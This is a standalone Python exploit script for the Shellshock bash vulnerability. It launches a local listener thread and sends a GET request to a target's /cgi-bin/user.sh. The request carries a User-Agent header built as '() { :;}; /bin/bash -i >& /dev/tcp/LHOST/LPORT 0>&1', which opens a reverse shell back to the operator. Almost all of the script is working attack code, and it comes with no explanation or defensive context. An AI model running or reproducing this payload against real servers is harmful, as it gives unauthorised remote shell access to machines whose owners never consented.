import requests
import warnings
from urllib.parse import quote
import argparse
import socket
import telnetlib
from threading import Thread
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

class Interface:
    def __init__(self):
        self.red = "\033[91m"
        self.green = "\033[92m"
        self.white = "\033[37m"
        self.yellow = "\033[93m"
        self.bold = "\033[1m"
        self.end = "\033[0m"

    def info(self, message):
        print(f"({self.white}*{self.end}) {message}")

    def warning(self, message):
        print(f"({self.yellow}!{self.end}) {message}")

    def error(self, message):
        print(f"({self.red}x{self.end}) {message}")

    def success(self, message):
        print(f"({self.green}✓{self.end}) {self.bold}{message}{self.end}")

def exploitFailed(msg):
    exit(output.error(f"FAILED!!"))

def encodeUrl(string):
    return quote(string, safe="")

def sendGet(url, headers={}, cookies={}):
    r = session.get(url, headers=headers, cookies=cookies, allow_redirects=False)
    return r

def exec_code(rport):
    handlerthr = Thread(target=handler, args=(rport,))
    handlerthr.start()

def handler(rport):
    output.success("Starting handler on port %d" % int(rport))
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", int(rport)))
    s.listen(1)
    conn, addr = s.accept()
    output.success("Connection from %s" % addr[0])
    t.sock = conn
    t.interact()
    return

session = requests.Session()
session.verify = False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u", "--url", help="Target ip address or hostname", required=True
    )
    parser.add_argument(
        "-l", "--lhost", help="Listening IP address for reverse shell", required=True
    )
    parser.add_argument(
        "-p", "--lport", help="Listening port for reverse shell", required=True
    )
    parser.add_argument(
        "-d",
        "--debug",
        help="Instruct our web requests to use our defined proxy",
        action="store_true",
        required=False,
    )
    args = parser.parse_args()

    target_url = args.url
    lhost = args.lhost
    lport = args.lport
    if args.debug:
        session.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }

    global output
    output = Interface()
    exec_code(lport)
    sendGet(target_url + "/cgi-bin/user.sh",{"User-Agent": "() { :;}; /bin/bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1;"})
    
